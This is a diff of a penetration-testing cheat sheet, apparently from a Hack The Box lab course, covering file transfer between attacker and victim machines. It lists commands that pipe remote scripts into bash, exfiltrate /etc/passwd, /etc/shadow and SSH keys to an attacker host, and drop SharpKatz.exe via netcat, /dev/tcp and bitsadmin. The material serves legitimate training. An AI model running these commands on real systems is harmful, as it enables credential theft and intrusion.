@@ -2,9 +2,9 @@
 
 ## PowerShell Base64 Encode & Decode
 
-`XeroCyb3r@htb[/htb]**$** md5sum id_rsa`
+`XeroCyb3r@htb[/htb] md5sum id_rsa`
 
-`XeroCyb3r@htb[/htb]**$** cat id_rsa |base64 -w 0;echo`
+`XeroCyb3r@htb[/htb] cat id_rsa |base64 -w 0;echo`
 
 `PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))`
 
@@ -58,21 +58,21 @@ This can be bypassed using the parameter `-UseBasicParsing`.
 
 ## **SMB Downloads**
 
-`XeroCyb3r@htb[/htb]**$** sudo impacket-smbserver share -smb2support /tmp/smbshare`
+`XeroCyb3r@htb[/htb] sudo impacket-smbserver share -smb2support /tmp/smbshare`
 
 `C:\htb> copy \\192.168.220.133\share\nc.exe`
 
 With a username & password
 
-`XeroCyb3r@htb[/htb]**$** sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
+`XeroCyb3r@htb[/htb] sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
 
 `C:\htb> net use n: \\192.168.220.133\share /user:test test`
 
 ## **FTP Downloads**
 
-`XeroCyb3r@htb[/htb]**$** sudo pip3 install pyftpdlib`
+`XeroCyb3r@htb[/htb] sudo pip3 install pyftpdlib`
 
-`XeroCyb3r@htb[/htb]**$** sudo python3 -m pyftpdlib --port 21`
+`XeroCyb3r@htb[/htb] sudo python3 -m pyftpdlib --port 21`
 
 `PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
 
@@ -88,17 +88,17 @@ When we get a shell on a remote machine, we may not have an interactive shell. I
 
 `PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`
 
-`XeroCyb3r@htb[/htb]**$** echo <Base64 hash> | base64 -d > hosts`
+`XeroCyb3r@htb[/htb] echo <Base64 hash> | base64 -d > hosts`
 
-`XeroCyb3r@htb[/htb]**$** md5sum hosts`
+`XeroCyb3r@htb[/htb] md5sum hosts`
 
 ## PowerShell Web Uploads
 
 PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function.
 
-`XeroCyb3r@htb[/htb]**$** pip3 install uploadserver`
+`XeroCyb3r@htb[/htb] pip3 install uploadserver`
 
-`XeroCyb3r@htb[/htb]**$** python3 -m uploadserver`
+`XeroCyb3r@htb[/htb] python3 -m uploadserver`
 
 Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations.
 
@@ -112,9 +112,9 @@ The script accepts two parameters `-File`, which we use to specify the file pat
 
 `PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
 
-`XeroCyb3r@htb[/htb]**$** nc -lvnp 8000`
+`XeroCyb3r@htb[/htb] nc -lvnp 8000`
 
-`XeroCyb3r@htb[/htb]**$** echo <base64> | base64 -d -w 0 > hosts`
+`XeroCyb3r@htb[/htb] echo <base64> | base64 -d -w 0 > hosts`
 
 ## SMB Uploads
 
@@ -124,9 +124,9 @@ In the following Wireshark capture, we attempt to connect to the file share `te
 
 To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)).
 
-`XeroCyb3r@htb[/htb]**$** sudo pip install wsgidav cheroot`
+`XeroCyb3r@htb[/htb] sudo pip install wsgidav cheroot`
 
-`XeroCyb3r@htb[/htb]**$** sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
+`XeroCyb3r@htb[/htb] sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
 
 `C:\htb> dir \\192.168.49.128\DavWWWRoot`
 
@@ -134,7 +134,7 @@ To set up our WebDav server, we need to install two Python modules, `wsgidav` 
 
 ## FTP Uploads
 
-`XeroCyb3r@htb[/htb]**$** sudo python3 -m pyftpdlib --port 21 --write`
+`XeroCyb3r@htb[/htb] sudo python3 -m pyftpdlib --port 21 --write`
 
 `PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
 
@@ -148,35 +148,35 @@ To set up our WebDav server, we need to install two Python modules, `wsgidav` 
 
 **Attacker**
 
-`[!bash!]**$** md5sum id_rsa`
+`[!bash!] md5sum id_rsa`
 
-`[!bash!]**$** cat id_rsa |base64 -w 0;echo`
+`[!bash!] cat id_rsa |base64 -w 0;echo`
 
 **Victim**
 
-`[!bash!]**$** echo -n '<base64>' | base64 -d > id_rsa`
+`[!bash!] echo -n '<base64>' | base64 -d > id_rsa`
 
-`[!bash!]**$** md5sum id_rsa`
+`[!bash!] md5sum id_rsa`
 
 ## **Web Downloads with Wget and cURL**
 
-`[!bash!]**$** wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
+`[!bash!] wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
 
-`[!bash!]**$** curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+`[!bash!] curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
 
 ## **Fileless Attacks Using Linux**
 
-`[!bash!]**$** curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
+`[!bash!] curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
 
-`[!bash!]**$** wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
+`[!bash!] wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
 
 ## **Download with Bash (/dev/tcp)**
 
-`[!bash!]**$** exec 3<>/dev/tcp/10.10.10.32/80`
+`[!bash!] exec 3<>/dev/tcp/10.10.10.32/80`
 
-`[!bash!]**$** echo -e "GET /LinEnum.sh HTTP/1.1\n\n">**&3**`
+`[!bash!] echo -e "GET /LinEnum.sh HTTP/1.1\n\n">**&3**`
 
-`[!bash!]**$** cat <&3`
+`[!bash!] cat <&3`
 
 ## **SSH Downloads**
 
@@ -186,15 +186,15 @@ To set up our WebDav server, we need to install two Python modules, `wsgidav` 
 
 Attacker
 
-`[!bash!]**$** sudo systemctl enable ssh`
+`[!bash!] sudo systemctl enable ssh`
 
-`[!bash!]**$** sudo systemctl start ssh`
+`[!bash!] sudo systemctl start ssh`
 
-`[!bash!]**$** netstat -lnpt`
+`[!bash!] netstat -lnpt`
 
 **Victim**
 
-`[!bash!]**$** scp plaintext@192.168.49.128:/root/myroot.txt .`
+`[!bash!] scp plaintext@192.168.49.128:/root/myroot.txt .`
 
 # **Upload Operations**
 
@@ -202,55 +202,55 @@ Attacker
 
 Attacker
 
-`[!bash!]**$** sudo python3 -m pip install --user uploadserver`
+`[!bash!] sudo python3 -m pip install --user uploadserver`
 
-`[!bash!]**$** openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
+`[!bash!] openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
 
-`[!bash!]**$** mkdir https && cd https`
+`[!bash!] mkdir https && cd https`
 
-`[!bash!]**$** sudo python3 -m uploadserver 443 --server-certificate /root/server.pem`
+`[!bash!] sudo python3 -m uploadserver 443 --server-certificate /root/server.pem`
 
 Victim
 
-`[!bash!]**$** curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
+`[!bash!] curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
 
 ## **Alternative Web File Transfer Method**
 
 Attacker
 
-`[!bash!]**$** python3 -m http.server`
+`[!bash!] python3 -m http.server`
 
 **OR**
 
-`[!bash!]**$** python2.7 -m SimpleHTTPServer`
+`[!bash!] python2.7 -m SimpleHTTPServer`
 
-`[!bash!]**$** php -S 0.0.0.0:8000`
+`[!bash!] php -S 0.0.0.0:8000`
 
-`[!bash!]**$** ruby -run -ehttpd . -p8000`
+`[!bash!] ruby -run -ehttpd . -p8000`
 
 Victim
 
-`[!bash!]**$** wget 192.168.49.128:8000/filetotransfer.txt`
+`[!bash!] wget 192.168.49.128:8000/filetotransfer.txt`
 
 ## SCP UPLOAD
 
-`[!bash!]**$** scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`
+`[!bash!] scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`
 
 # **Transfering Files with Code**
 
-`XeroCyb3r@htb[/htb]**$** python2.7 -c 'import urllib;urllib.urlretrieve ("<Target File Url>", "LinEnum.sh")'`
+`XeroCyb3r@htb[/htb] python2.7 -c 'import urllib;urllib.urlretrieve ("<Target File Url>", "LinEnum.sh")'`
 
-`XeroCyb3r@htb[/htb]**$** python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
+`XeroCyb3r@htb[/htb] python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
 
-`XeroCyb3r@htb[/htb]**$** php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
+`XeroCyb3r@htb[/htb] php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
 
-`XeroCyb3r@htb[/htb]**$** php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
+`XeroCyb3r@htb[/htb] php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
 
-`XeroCyb3r@htb[/htb]**$** php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
+`XeroCyb3r@htb[/htb] php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
 
-`XeroCyb3r@htb[/htb]**$** ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
+`XeroCyb3r@htb[/htb] ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
 
-`XeroCyb3r@htb[/htb]**$** perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
+`XeroCyb3r@htb[/htb] perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
 
 ### JavaScript
 
@@ -293,9 +293,9 @@ end with
 
 ## Upload Operations using Python3
 
-`XeroCyb3r@htb[/htb]**$** python3 -m uploadserver`
+`XeroCyb3r@htb[/htb] python3 -m uploadserver`
 
-`XeroCyb3r@htb[/htb]**$** python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`
+`XeroCyb3r@htb[/htb] python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`
 
 # Miscellaneous File Transfer Methods
 
@@ -303,35 +303,35 @@ end with
 
 ## Netcat
 
-**Compromised:** `victim@target:~**$** nc -l -p 8000 > SharpKatz.exe`
+**Compromised:** `victim@target:~ nc -l -p 8000 > SharpKatz.exe`
 
-`XeroCyb3r@htb[/htb]**$** nc -q 0 192.168.49.128 8000 < SharpKatz.exe`
+`XeroCyb3r@htb[/htb] nc -q 0 192.168.49.128 8000 < SharpKatz.exe`
 
 **Sending File as Input**
 
-`XeroCyb3r@htb[/htb]**$** sudo nc -l -p 443 -q 0 < SharpKatz.exe`
+`XeroCyb3r@htb[/htb] sudo nc -l -p 443 -q 0 < SharpKatz.exe`
 
-`victim@target:~**$** nc 192.168.49.128 443 > SharpKatz.exe`
+`victim@target:~ nc 192.168.49.128 443 > SharpKatz.exe`
 
 OR
 
-`victim@target:~**$** cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`
+`victim@target:~ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`
 
 ## Ncat
 
-Compromised: `victim@target:~**$** ncat -l -p 8000 --recv-only > SharpKatz.exe`
+Compromised: `victim@target:~ ncat -l -p 8000 --recv-only > SharpKatz.exe`
 
-`XeroCyb3r@htb[/htb]**$** ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`
+`XeroCyb3r@htb[/htb] ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`
 
 **Sending File as Input**
 
-`XeroCyb3r@htb[/htb]**$** sudo ncat -l -p 443 --send-only < SharpKatz.exe`
+`XeroCyb3r@htb[/htb] sudo ncat -l -p 443 --send-only < SharpKatz.exe`
 
-`victim@target:~**$** ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`
+`victim@target:~ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`
 
 **OR**
 
-`victim@target:~**$** cat < /dev/tcp/192.168.49.128/443 > <filename>`
+`victim@target:~ cat < /dev/tcp/192.168.49.128/443 > <filename>`
 
 # PowerShell Session File Transfer
 
@@ -361,9 +361,9 @@ Copy DATABASE.txt from DATABASE01 Session to our Localhost
 
 RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access.
 
-`XeroCyb3r@htb[/htb]**$** rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
+`XeroCyb3r@htb[/htb] rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
 
-`XeroCyb3r@htb[/htb]**$** xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
+`XeroCyb3r@htb[/htb] xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
 
 To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
 
@@ -379,17 +379,17 @@ Many different methods can be used to encrypt files and information on Windows s
 
 [OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files
 
-`XeroCyb3r@htb[/htb]**$** openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`
+`XeroCyb3r@htb[/htb] openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`
 
-`XeroCyb3r@htb[/htb]**$** openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`
+`XeroCyb3r@htb[/htb] openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`
 
 # Catching Files over HTTP/S
 
 ### Nginx - Enabling PUT
 
-`XeroCyb3r@htb[/htb]**$** sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
+`XeroCyb3r@htb[/htb] sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
 
-`XeroCyb3r@htb[/htb]**$** sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
+`XeroCyb3r@htb[/htb] sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
 
 Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents
 
@@ -404,27 +404,27 @@ server {
 }
 ```
 
-`XeroCyb3r@htb[/htb]**$** sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
+`XeroCyb3r@htb[/htb] sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
 
-`XeroCyb3r@htb[/htb]**$** sudo systemctl restart nginx.service`
+`XeroCyb3r@htb[/htb] sudo systemctl restart nginx.service`
 
 ## Verifying errors
 
-`XeroCyb3r@htb[/htb]**$** tail -2 `/var/log/nginx/error.log``
+`XeroCyb3r@htb[/htb] tail -2 `/var/log/nginx/error.log``
 
-`XeroCyb3r@htb[/htb]**$** ss -lnpt | grep `80``
+`XeroCyb3r@htb[/htb] ss -lnpt | grep `80``
 
-`XeroCyb3r@htb[/htb]**$** ps -ef | grep `2811``
+`XeroCyb3r@htb[/htb] ps -ef | grep `2811``
 
 **Remove Nginx Config**
 
-`XeroCyb3r@htb[/htb]**$** sudo rm /etc/nginx/sites-enabled/default`
+`XeroCyb3r@htb[/htb] sudo rm /etc/nginx/sites-enabled/default`
 
 **Testing**
 
-`XeroCyb3r@htb[/htb]**$** curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
+`XeroCyb3r@htb[/htb] curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
 
-`XeroCyb3r@htb[/htb]**$** tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`
+`XeroCyb3r@htb[/htb] tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`
 
 # Living off The Land
 
@@ -446,13 +446,13 @@ Upload win.ini to our Pwnbox
 
 `C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini`
 
-`XeroCyb3r@htb[/htb]**$** sudo nc -lvnp 80`
+`XeroCyb3r@htb[/htb] sudo nc -lvnp 80`
 
-`XeroCyb3r@htb[/htb]**$** openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
+`XeroCyb3r@htb[/htb] openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
 
-`XeroCyb3r@htb[/htb]**$** openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`
+`XeroCyb3r@htb[/htb] openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`
 
-`XeroCyb3r@htb[/htb]**$** openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`
+`XeroCyb3r@htb[/htb] openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`
 
 `PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`
 
